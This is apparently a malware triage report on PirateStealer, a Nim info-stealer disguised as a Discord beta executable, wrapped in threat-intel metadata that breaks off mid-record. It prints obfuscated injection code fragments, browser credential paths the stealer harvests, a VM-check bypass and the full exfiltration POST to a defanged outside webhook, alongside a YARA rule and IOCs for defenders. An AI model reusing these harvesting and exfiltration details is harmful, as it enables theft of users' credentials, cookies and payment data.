{
    "id": "e6a475fe-554e-44a9-8dc2-67e98e089826",
    "created_at": "2023-01-12T15:09:10.062939Z",
    "updated_at": "2025-03-27T02:15:35.671279Z",
    "deleted_at": null,
    "sha1_hash": "05c2bc9fa757a36123fa380da57367a12030a4e9",
    "title": "2022-12-01 - Malware Analysis and Triage Report - PirateStealer - Discord_beta.exe",
    "authors": "",
    "file_creation_date": "2022-12-29T00:19:58Z",
    "file_modification_date": "2022-12-29T00:19:58Z",
    "file_size": 1799860,
    "plain_text": "# Malware Analysis and Triage Report : PirateStealer - Discord_beta.exe\n\n**[mostwanted002.cf/post/malware-analysis-and-triage-report-piratestealer/](https://mostwanted002.cf/post/malware-analysis-and-triage-report-piratestealer/)**\n\nMayank Malik December 1, 2022\n\n#### You’ve been invited to test out BETA FEATURES OF DISCORD!!\n\n Mayank Malik Dec 1, 2022\n8 min read\n\n\n-----\n\n## 1. Executive Summary\n\n A. Fingerprinting\n\n#### 1. MD5: c5782ebad92661d4acfacaf4daa1fc52 2. SHA256: 1b82ac159d87162964a4eb61122bb411a35e748e135cc3b97ab39466e5827c7e 3. VirusTotal Report:\n```\n   https://www.virustotal.com/gui/file/1b82ac159d87162964a4eb61122bb411a35e7\n   48e135cc3b97ab39466e5827c7e\n\n## B. Classification\n\n#### PirateStealer is a new Info Stealer in the scene. Not much info is provided about this family and the sample is relatively new. No traces has been found on either Malware Bazaar or Malpedia.\nThe sample will be submitted to aforementioned databases after this post.\n\n## C. Behavioral Summary\n\n#### The sample executes itself and checks for presence of Virtualized Environment by using registry information and disk drive identifiers. It throws an error and exists itself after failing the virtualization check. If the check succeeds, it scours through the directory C:\\User\\\n<username>\\AppData\\Local\\* to harvest credentials, create an archive save.zip and\n\n exfiltrate it over HTTPS to an endpoint on 4wz[.]us\n\n## 2. Static Analysis\n\n#### Some interesting strings that confirm the info stealer is programed using Nim\n   bitstreams.nim\n\n   @iterators.nim(240, 11) `len(a) == L` the length of the seq changed while\n   iterating over it\n\n   deflate.nim\n\n   gzip.nim\n\n   zippy.nim\n\n   db_sqlite.nim\n\n   puppy.nim\n\n   db_sqlite.nim\n\n```\n\n-----\n\n#### Imported function calls from standard DLL files\n\n Fuction Name Suspicious\n\n CloseHandle\n\n CreateFileA\n\n CreateFileMappingA\n\n CreateFileMappingW\n\n CreateFileW\n\n CreateMutexW Y\n\n DeleteCriticalSection\n\n DeleteFileA\n\n DeleteFileW\n\n EnterCriticalSection\n\n FlushFileBuffers\n\n FlushViewOfFile\n\n FormatMessageA\n\n FormatMessageW\n\n FreeLibrary\n\n GetCurrentProcessId Y\n\n GetCurrentThreadId Y\n\n GetDiskFreeSpaceA\n\n GetDiskFreeSpaceW\n\n GetFileAttributesA\n\n GetFileAttributesExW\n\n GetFileAttributesW\n\n GetFileSize\n\n GetFullPathNameA\n\n\n-----\n\n#### Fuction Name Suspicious\n\n GetFullPathNameW\n\n GetLastError\n\n GetProcAddress Y\n\n GetProcessHeap Y\n\n GetStartupInfoA Y\n\n GetSystemInfo Y\n\n GetSystemTime\n\n GetSystemTimeAsFileTime\n\n GetTempPathA\n\n GetTempPathW\n\n GetTickCount Y\n\n GetVersionExA\n\n GetVersionExW\n\n HeapAlloc\n\n HeapCompact\n\n HeapCreate\n\n HeapDestroy\n\n HeapFree\n\n HeapReAlloc\n\n HeapSize\n\n HeapValidate\n\n InitializeCriticalSection\n\n IsDBCSLeadByteEx\n\n LeaveCriticalSection\n\n LoadLibraryA Y\n\n\n-----\n\n#### Fuction Name Suspicious\n\n LoadLibraryW Y\n\n LocalFree\n\n LockFile\n\n LockFileEx\n\n MapViewOfFile\n\n MultiByteToWideChar\n\n OutputDebugStringA\n\n OutputDebugStringW\n\n QueryPerformanceCounter\n\n ReadFile\n\n SetEndOfFile\n\n SetFilePointer\n\n SetUnhandledExceptionFilter\n\n Sleep\n\n SystemTimeToFileTime\n\n TlsGetValue\n\n TryEnterCriticalSection\n\n UnlockFile\n\n UnlockFileEx\n\n UnmapViewOfFile\n\n VirtualAlloc Y\n\n VirtualFree\n\n VirtualProtect Y\n\n VirtualQuery\n\n WaitForSingleObject\n\n\n-----\n\n#### Fuction Name Suspicious\n\n WaitForSingleObjectEx\n\n WideCharToMultiByte\n\n WriteFile\n\n A highly obfuscated JavaScript file was found in the executable.\n\n On deobfuscation of the above, following script was recovered.\n\n\n-----\n\n```\nlet\n\nvar _0x4e36eb = _0x534c;\n\nfunction _0x534c(_0x534ce2, _0x16ca1e) {\n\n  var _0x53c7eb = _0x519e();\n\n  return _0x534c = function (_0x8a4667, _0x43ddf0) {\n\n    _0x8a4667 = _0x8a4667 - (0x1d98 + -0x1329 + 0x1d2 * -0x5);\n\n    var _0x1cdf74 = _0x53c7eb[_0x8a4667];\n\n    return _0x1cdf74;\n\n  }, _0x534c(_0x534ce2, _0x16ca1e);\n\n}\n\nfunction _0x519e() {\n\n  var _0x2b3aad = ['np?(gg=win', 'PBOWW', 'querystrin', 'https:/', 'Added',\n'3308240uRVMVW', 'atus.disco', 'APsQN', 'a-zA-Z_$][', ',delete gg', 'CSsXV', 'Credit\nCar', 'it_card:', 'ization\\\", ', 'teway.disc', 'wfMND', 'r:87475080', 'm/api/v*/u',\n'des__', ', false );', ':detective', 'init-notif', '<:staff:87', 'dccto', 'length',\n'qfsKk', '){let b=gg', 'etToken())', 'ord.com/ap', 'XncJL', 'tToken\\'==a', 'omdeg',\n'solve, rej', 'filter', 'instant', 'seText', 'Code', 'ppIpa', '\\x0aIP: \\x0a',\n'\\\"get_requi', 'TAGOR', 'aYEzE', 'sSijL', 'KBwCt', 'Total Frie', 'wKZjJ',\n'Expiration', 'vwlRl', 'lete gg.m.', 'AcoOC', 'XskMY', 'f.surf/raw', 'Zzhbc',\n'GNmhe', '0e9b68a72f', 'https://di', 'wfvqi', 'MeWEl', '262128NuIOoY', 'orts=c},[[',\n'() {\\x0a   ', 'NheeB', 'ciuSB', 'RKogs', 'wzwea', 'rOYnM', 'avgKz', '\\x0a```',\n'mxYAj', 'FQHdE', 'rXtXQ', 'Authorizat', 'irDNj', 'new_passwo', 'ofqjO', 'No Nitro',\n'rxxIn', 'HmBlt', 'MZoXH', 'GARxw', 'in before)', ' false ); ', 'KCfWR',\n'api/v*/aut', 't c in gg.', 'pp.push([[', 'ut(){(func', 'Cgrtz', 'ader(\\\"Auth', 'New\nPasswo', 'mevkn', 'd5b7ffb2b4', '.send( nul', 'jTHbE', 'call', '.setReques',\n'/v*/schedu', 'RVzOJ', 'n\\');xmlHtt', 'orization\\\"', 'CBteQ', 'UBaAx', 'ate\\\":false',\n'.c[a].expo', '<:partner:', 'hasOwnProp', 'quire\\']]])', 'gEGLB', 'Password C', 'ut\n(User n', '<:hypesqua', 'eXdml', '&&(token=b', 'ibrary', 'Math.rando', 'QIGKA',\n'PxSOz', 'lIUkL', 'nds (', 'hDSBx', 'discrimina', '   ', 'FhNxM', '6661178a2c',\n'embed-colo', 'HjNsE', 'GHhZo', 'PCAZg', 'Text', 'sycCv', 'p.response', 'kVRzM',\n'PjrcV', 'ear]', 'tokens', 'g.c.get_re', 'fields', 'scord.com/', 't)))return',\n'3cfd898a34', 'uOInW', 'nction (re', 'fyejx', 'EaIrv', 'T\\\", \\\"', '.__esModul',\n'kdiscord_a', 'OST\\\", \\\"htt', 'pIFwZ', 'card[exp_y', 'ebpackChun', '712885yttDlO',\n'esponse)\\x0a ', 'XGjSx', 'bJgUI', 'quDYI', 'ZWwEd', '}));xmlHtt', 'nd( null )',\n'MZran', '_require:(', 'EUsjW', 'OJmpO', 'iekvl', 'Bgmbs', 'curity-pol', 'sODNh',\n'Info', 'RtCnF', '    res', 'oUNqs', 'startsWith', 'te-auth-ga', 'wtrRE', 'XqPuC',\n'nfTlj', 'stringify', 'trol-Allow', 'api/v*/use', '044afa86c0', 'BNGsw', 'endsWith',\n'erty(c)){c', '&&window.w', '3|1|5|4|2|', '666152>', 'onth]', 'CC Number',\n'261692be77', 'https://ap', 'Hbiyu', 'nst b=\\\"str', 'string', 'MYzmA', 'frien',\n'oXoGC', 'st(); xmlH', 'ogged in)', 'h/login', 'onBeforeRe', 'ler', 'l );xmlHtt',\n'nNDpg', 'scordapp.c', 'None', 'packChunkd', 'HJkPh', 'ult)for(le', 'ekaHc', 'hVBNq',\n'Discord In', 'hCisG', ',c)=>a.exp', 'll ); xmlH', '%LOGOUT%', '67292683>', 'qDnjj',\n'ce:8747508', './core.asa', 'rary', 'jWIqj', 'z.us/webho', '.open(\\\"POS',\n'cation/jso', 'n\\');xhr.se', 'Access-Con', 'n.discorda', 'tp.open( \\\"', 'HsWzL',\n'LIMNx', 'CDBUT', 'rPUXn', 'while (tru', 'QXtBk', 'IXdYu', 'jlJkn', 'eGNQG', 'icy',\n'zkLNj', '.send(JSON', 'REDyx', 'authorizat', 'quire):win', 'uPgpS', 'action',\n'auth/login', 'ing\\\"==type', '7299264akWYrI', '0833860819', 'Nitro Boos',\n'nances/upc', 'KXpeG', 'backup_cod', 'ASPvi', 'AnBwe', '`??` <:pay', 'Qzuky',\n'QuUOv', 'h.random()', 'eceived', 'm/api/v*/a', 'detectable', 'AiUeV', '9> Click', �\n'iMZRC', 'OIQYD', 'mXMdv', 'cardnumber', 'ogged out', '113823>', '.stringify',\n\n```\n\n-----\n\n```\n ;xmlHttp.r, 7475080859, f them](, 0bae463b62, Nitro Cla, RneOZ,\n'pal:896441', 'IRorc', '8747508086', 'bEJOo', 'ged', '.default.g', 'XSFpY', 'WPGIP',\n'e\\', \\'appli', 'constructo', 'SWgNo', 'ttp.respon', 'Promise(fu', 'tRequestHe',\n'gGChN', 'handle', '[**<:partn', '({\\\"passwor', 'p.send( nu', 'BmfaL', 'p = new XM',\n'gg.c)if(gg', 'mfa', 'Token', 'QyxBl', 'gznBU', 'exports', 'hanged', 'c \\'*\\'',\n'type', 'join', 'BFLMt', 'd[b]:a(d))', '/v9/users/', 'zUUpR', 'tars/', '[],{get_re',\n'creditCard', 'NrTCl', 'breeg', 'VsiSX', 'avatar', 'e: \\x0a', '0e51da53ac', 'm()],\n{},a=', 'kfqsq', 'ows', 'VDMFd', 'uire,delet', 'https://ct', 'XWYvO',\n'\\x0aInjection', 'qbbDT', 'XIyoy', 'fVGaB', 'IptgU', 'uqvDV', 'scord_app.', 'lJCpo',\n'RTUQn', 'statusCode', 'izeeD', 'qXVEh', 'wWdXu', 'tzYpP', '`?`', 'lHttp.setR',\n'4477056>', 'eRsvU', 'HlluF', 'CqJXz', 'ePErz', 'jfKbG', 'Email Chan', '-sources\\\",',\n'    }\\x0a ', 's/detectab', 'cYCTW', 'EAMwn', 'logout', 'VEwOw', 'illing/sub',\n'88952075>', 'e);xmlHttp', 'PFCvw', 'RXhXV', 'fFsJL', 'zgpHS', 'KdeiM', 'onst d=gg.',\n'XUwuo', 'get_requir', 'PirateStea', 'ction LogO', 'VvjjF', 'rd.com/api', 'email',\n'efault[b]:', 'sers/@me/b', 'iNLfL', 'Value', 'Lvuyw', 'esponseTex', 'gPPIE', '\\\\+\\\\+\n*(?:[', 'h([[],{get', 'oming.json', 'onp.push([', 'Nitro', 'c633748151', 'MJEyc',\n'lpxpM', 'Badges', 'ac162fb948', 'split', 'stHeader(\\\"', 'rcLQC', 'login', 'GKwDl',\n'513qIUJCP', 'c)if(gg.c.', 'getAllWind', 'e&&d.defau', 'riptions', 'NrdYM', '    \nxh', 'nEceC', 'rs/@me/lib', 'vtYDK', 'c[c].expor', 'userLogin', 'fpiFR', 'Xqopk',\n'icy-report', 'jIHIQ', 'ePOgR', 'hmivT', 'quire:(a,b', 'kBJCB', '@me\\\", fals',\n'@everyone', '](https://', 'uFnvA', ';if(d&&(b?', 'ofdcM', 'GCPrj', 'd_events:8',\n'rmdirSync', 'aw/', 'tadaY', 'GiEFi', 'tor', 'ykpop', 'CvUvx', 'ZDdGx', 'false );xm',\n'xpBES', 'executeJav', 'd\\\":\\\"', '7bfd1f547e', 'for(let a ', 'rs/@me', '8d47b006a4',\n'AkhBD', 'NGnMY', 'sers/@me/l', 'user', 'card[exp_m', '6df76d9cd3', 'ringify(',\n'ca50f6e4ec', 'counter', 'sJmuc', 'content-se', 'qQkwR', 'NuNkF', 'User Login',\n'YSffi', '78354964>', ' function ', 'card[cvc]', '@me/relati', 'Boedc', 'stateObjec',\n'PhTSi', '6PtQXNK', 'sMouD', '\\\").logout(', 'gXCaa', 'jhhnC', 'z.us', 'rs/@me/bil',\n'-Origin \\'*', '3699f4cb0c', 'PAZzF', 'MeNnf', 'elidq', 'code', 'gfoOb', 'jKYKG',\n'ozEcT', 'Rare', 'api/v*/app', 'st();xmlHt', 'bytes', ')return d}', 'scriptions',\n'lOikq', 'UscNK', 'qAftj', 'picoP', 'nd(JSON.st', 'ydNUv', 'GByIe', '/@me/billi',\n'jLvHj', 're\\\"]]]),de', 'ERbYq', 'EFGNV', 'gger', 'ukVTp', '58>', 'aScript', 'LcvMp',\n'insert', 'xplVr', 'kDScI', 'window.web', 'ykgzz', 'ssic`', 'SJhDu', '4750808728',\n'forEach', '\\x0a   new ', 'oVaUi', '<:bravery:', 'lnSmv', 'oTfPf', 'in window.',\n'yZutt', 'lGSsh', 'bHqdw', 'vYIBT', 'bKsdf', 'ontent-Typ', 'Text;', 'ot Logged ',\n'zhHDK', 'BGbJx', 'CVC', 'yexternali', 'XFwxu', 'function *', 'quest', 'lerBTW',\n'/v8/users/', ')}LogOut()', 'xEGik', 'VKwNJ', '<:bughunte', 'JegoJ', 'ps://www.m',\n'8472825986', 'POST', 'password', 'xhr = new ', 'disable-qr', 'om/v1/toke',\n'befba77ea3'];\n\n  _0x519e = function () {\n\n    return _0x2b3aad;\n\n  };\n\n  return _0x519e();\n\n}(function (_0x3f6ee4, _0x2fc5be) {\n\n  var _0x346931 = _0x534c,\n\n    _0x41454c = _0x3f6ee4();\n\nThe full code can be found [here](https://mostwanted002.cf/post/malware-analysis-andtriage-report-piratestealer/javascript_file.js)\n\n## 3. Dynamic Analysis\n\n```\n\n-----\n\n#### Initially, the executable checks for presence of virtualization environment by reading registry key values for disk identifiers and tries to match it against common virtual disk strings like VMware, Vbox, Ven_Msft (Hyper-V). If the check fails, the executable exits after throwing the following error.\n\n This can be bypassed via two methods:\n\n 1. Either patch on fly by loading it in Debugger and changing the register values to\n bypass the check. 2. Modify registry values before executing the sample.\n```\n      HKLM\\SYSTEM\\CurrentControlSet\\Services\\disk\\Enum\n      HKLM\\SYSTEM\\CurrentControlSet\\Services\\EhStorClass\\Enum\n\n Sample in x64dbg\n\n```\n\n-----\n\n#### Calling the function to check for virtualization\n\n Registry keys being queried\n\n\n-----\n\n#### On successful execution, the sample scours through the files and folder located inside\n```\nC:\\Users\\<username>\\AppData\\Local to harvest saved credentials and sensitive\n\n information.\n\n The files and folders checked during analysis in the mentioned directory:\n\n```\n\n-----\n\n```\n C:\\Users\\Baldur\\AppData\\Local\n\n\"C:\\Users\\Baldur\\AppData\\Local\\*\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\BraveSoftware\\Brave-Browser\\User\nData\\Default\\Local Extension Settings\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Chromium\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\*\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome Beta\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome Beta\\User Data\\Default\\Local\nExtension Settings\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\*\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Bookmarks\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History_tmp\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History_tmpjournal\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\History_tmp-wal\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local Extension\nSettings\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local\nStorage\\leveldb\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local\nStorage\\leveldb\\*\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local\nStorage\\leveldb\\000003.ldb\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Local\nStorage\\leveldb\\000004.log\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data_tmp\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data_tmpjournal\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Login Data_tmpwal\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User\nData\\Default\\Network\\Cookies_tmp\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User\nData\\Default\\Network\\Cookies_tmp-journal\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User\nData\\Default\\Network\\Cookies_tmp-wal\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data_tmp\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data_tmpjournal\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Web Data_tmp-wal\"\n\"C:\\Users\\Baldur\\AppData\\Local\\Growtopia\\save.dat\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\*\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\*\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Bookmarks\"\n\n```\n\n-----\n\n```\n C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History_tmp\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History_tmpjournal\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\History_tmp-wal\"\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Local Extension\nSettings\\ejbalbakoplchlghecdalmeeeajnimhm\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data_tmp\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data_tmpjournal\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Login Data_tmpwal\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Network\\Cookies\"\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User\nData\\Default\\Network\\Cookies_tmp\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User\nData\\Default\\Network\\Cookies_tmp-journal\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User\nData\\Default\\Network\\Cookies_tmp-wal\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Web Data\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Web Data_tmp\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Web Data_tmpjournal\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Default\\Web Data_tmpwal\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Microsoft\\Edge\\User Data\\Local State\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Opera Software\\Opera GX Stable\\Local Extension\nSettings\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\Opera Software\\Opera Stable\\Local Extension\nSettings\"\n\n\"C:\\Users\\Baldur\\AppData\\Local\\ProtonVPN\"\n\n#### The sample then proceeds to copy the found credentials to C:\\Users\\\n<username>\\AppData\\Local\\Temp\\save\\ directory and creates an archive save.zip in\nC:\\Users\\<username>\\AppData\\Local\\Temp directory. This zip file is used to exfiltrate\n\n the data to the retrieval endpoint.\n\n```\n\n-----\n\n#### A HTTP POST request is made to the URL\n```\nhxxps[:]//4wz[.]us/webhooks/85dd00c63374815179f0c5e26f722df1b3b90bae463b6\n26df76d9cd37bfd1f547ed5b7ffb2b40e9b68a72fac162fb948c11a0b8bb43699f4cb0c59\n85cb3f69a9cffed5ed0081508085261692be77b84317f4fa6661178a2c0ec08199db0e51d\na53ac7b54e5556d3cfd898a347e21ad78a7044afa86c0ca50f6e4ecbefba77ea38d47b006\na454b2754a22e01a858030e5 with the following payload\nPOST\n/webhooks/85dd00c63374815179f0c5e26f722df1b3b90bae463b626df76d9cd37bfd1f547ed5b7\nffb2b40e9b68a72fac162fb948c11a0b8bb43699f4cb0c5985cb3f69a9cffed5ed00815080852616\n92be77b84317f4fa6661178a2c0ec08199db0e51da53ac7b54e5556d3cfd898a347e21ad78a7044a\nfa86c0ca50f6e4ecbefba77ea38d47b006a454b2754a22e01a858030e5 HTTP/1.1\n\nConnection: close\n\nContent-Type: multipart/form-data; boundary=-------------------------gwtwrxsavebqtmsyuoqimtdi\n\nAccept: */*\n\nAccept-Encoding: gzip, deflate\n\nUser-Agent: Puppy\n\nContent-Length: 6665\n\nHost: 4wz.us\n\n----------------------------gwtwrxsavebqtmsyuoqimtdi\n\nContent-Disposition: form-data; name=\"payload_json\"\n\nContent-Type: application/json\n\n{\"content\": \"\", \"username\": \"PirateStealer\", \"avatar_url\": \"\", \"attachments\":\n[], \"embeds\": [{\"title\": \"Thanks for using PirateStealer\", \"description\":\n\"Succesfully recover : **\\nð¦ 0 Metamask Recovery Key, \\nð 0 Extension\nWallets, \\nð° 0 Cold wallets, \\nð 0 Passwords, \\nðª 13 Cookies,\n\\nð³ 0 Cards, \\nð 0 Autofills **\\n and much more in `save.zip`\",\n\"image\": \"\", \"url\": \"\", \"author\": {\"name\": \"\", \"url\": \"\", \"icon_url\": \"\"},\n\"footer\": {\"text\": \"\", \"icon_url\": \"\"}, \"fields\": [{\"name\": \"Computer Username\",\n\"value\": \"Baldur\", \"inline\": true}, {\"name\": \"Hostname\", \"value\": \"DESKTOPT59267A\\n\", \"inline\": true}], \"color\": 0, \"timestamp\": \"\", \"thumbnail\": {\"url\":\n\"\"}}]}\n\n----------------------------gwtwrxsavebqtmsyuoqimtdi\n\nContent-Disposition: form-data; name=\"file\"; filename=\"save.zip\"\n\nContent-Type: application/zip\n\n<ZIP FILE BINARY CONTENTS>\n\n----------------------------gwtwrxsavebqtmsyuoqimtdi-\n```\n\n-----\n\n#### Data exfiltration request\n\n Once the data is successfully exfiltrated, the executable deletes the file save.zip and exits.\n\n## 4. YARA Rules and IOCs\n\n\n-----\n\n#### 1. YARA Rule\n```\n   rule pirate_stealer : infostealer\n\n   {\n\n     meta:\n\n         description = \"This rule is to identify PirateStealer Infostealers\"\n\n      author = \"mostwanted002\"\n\n      date = \"2022-12-01\"\n\n     strings:\n\n         $pirate = \"PirateStealerEvent\" nocase\n\n         $nim1 = \"deflate.nim\"\n\n         $nim2 = \"zippy.nim\"\n\n         $nim3 = \"db_sqlite.nim\"\n\n         $nim4 = \"puppy.nim\"\n\n         $nim5 = \"gzip.nim\"\n\n       condition:\n\n         $pirate and ($nim1 or $nim2 or $nim3 or $nim4 or $nim5)\n\n   }\n\n 2. IOCs\n      4wz[.]us\n      hxxps[:]//4wz[.]us/webhooks/85dd00c63374815179f0c5e26f722df1b3b90bae\n      463b626df76d9cd37bfd1f547ed5b7ffb2b40e9b68a72fac162fb948c11a0b8bb436\n      99f4cb0c5985cb3f69a9cffed5ed0081508085261692be77b84317f4fa6661178a2c\n      0ec08199db0e51da53ac7b54e5556d3cfd898a347e21ad78a7044afa86c0ca50f6e4\n      ecbefba77ea38d47b006a454b2754a22e01a858030e5\n\n```\n[Mayank Malik](https://mostwanted002.gitlab.io/)\n\nCRTP | Incident Responder | Synack Red Team Member | Threat Analyst | Security Researcher |\nCloud/Network Architect\n\n\n-----\n\n#### Mayank Malik is a tech savvy person, Red Team Enthusiast, and likes to wander around to learn new stuff. Cryptography, Networking and System Administrations are his forte. He’s one of the Founding Members for CTF Team, Abs0lut3Pwn4g3, and Core Member at DC 91120 (DEFCON Community Group). Apart from the mentioned skills, he’s good at communication skills and is goal oriented person. Yellow belt holder at pwn.college in pursue\n\n of learning and achieving Blue Belt.\n\n### Related\n\n#### Conti Locker Analysis\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Malware Defense/Malware Analysis 2022/2022-12-01 - Malware Analysis and Triage Report - PirateStealer - Discord_beta.exe.pdf"
    ],
    "report_names": [
        "2022-12-01 - Malware Analysis and Triage Report - PirateStealer - Discord_beta.exe.pdf"
    ],
    "threat_actors": [
        {
            "id": "d90307b6-14a9-4d0b-9156-89e453d6eb13",
            "created_at": "2022-10-25T16:07:23.773944Z",
            "updated_at": "2025-03-27T02:02:09.974695Z",
            "deleted_at": null,
            "main_name": "Lead",
            "aliases": [
                "Casper",
                "TG-3279"
            ],
            "source_name": "ETDA:Lead",
            "tools": [
                "Agentemis",
                "BleDoor",
                "Cobalt Strike",
                "CobaltStrike",
                "RbDoor",
                "RibDoor",
                "Winnti",
                "cobeacon"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "9f101d9c-05ea-48b9-b6f1-168cd6d06d12",
            "created_at": "2023-01-06T13:46:39.396409Z",
            "updated_at": "2025-03-27T02:00:03.074969Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
                "CHROMIUM",
                "ControlX",
                "Red Dev 10",
                "RedHotel",
                "Red Scylla",
                "TAG-22",
                "BRONZE UNIVERSITY",
                "AQUATIC PANDA",
                "Charcoal Typhoon",
                "BountyGlad"
            ],
            "source_name": "MISPGALAXY:Earth Lusca",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "f8dddd06-da24-4184-9e24-4c22bdd1cbbf",
            "created_at": "2023-01-06T13:46:38.626906Z",
            "updated_at": "2025-03-27T02:00:02.877001Z",
            "deleted_at": null,
            "main_name": "Tick",
            "aliases": [
                "Stalker Taurus",
                "PLA Unit 61419",
                "Nian",
                "BRONZE BUTLER",
                "REDBALDKNIGHT",
                "STALKER PANDA",
                "G0060"
            ],
            "source_name": "MISPGALAXY:Tick",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "9041c438-4bc0-4863-b89c-a32bba33903c",
            "created_at": "2023-01-06T13:46:38.232751Z",
            "updated_at": "2025-03-27T02:00:02.778714Z",
            "deleted_at": null,
            "main_name": "Nitro",
            "aliases": [
                "Covert Grove"
            ],
            "source_name": "MISPGALAXY:Nitro",
            "tools": [],
            "source_id": "MISPGALAXY",
            "reports": null
        },
        {
            "id": "a2b44a04-a080-4465-973d-976ce53777de",
            "created_at": "2022-10-25T16:07:23.911791Z",
            "updated_at": "2025-03-27T02:02:10.025108Z",
            "deleted_at": null,
            "main_name": "Nitro",
            "aliases": [
                "Covert Grove",
                "Nitro"
            ],
            "source_name": "ETDA:Nitro",
            "tools": [
                "AngryRebel",
                "Backdoor.Apocalipto",
                "Chymine",
                "Darkmoon",
                "Farfli",
                "Gen:Trojan.Heur.PT",
                "Gh0st RAT",
                "Ghost RAT",
                "Moudour",
                "Mydoor",
                "PCClient",
                "PCRat",
                "Poison Ivy",
                "SPIVY",
                "Spindest",
                "pivy",
                "poisonivy"
            ],
            "source_id": "ETDA",
            "reports": null
        },
        {
            "id": "6abcc917-035c-4e9b-a53f-eaee636749c3",
            "created_at": "2022-10-25T16:07:23.565337Z",
            "updated_at": "2025-03-27T02:02:09.868522Z",
            "deleted_at": null,
            "main_name": "Earth Lusca",
            "aliases": [
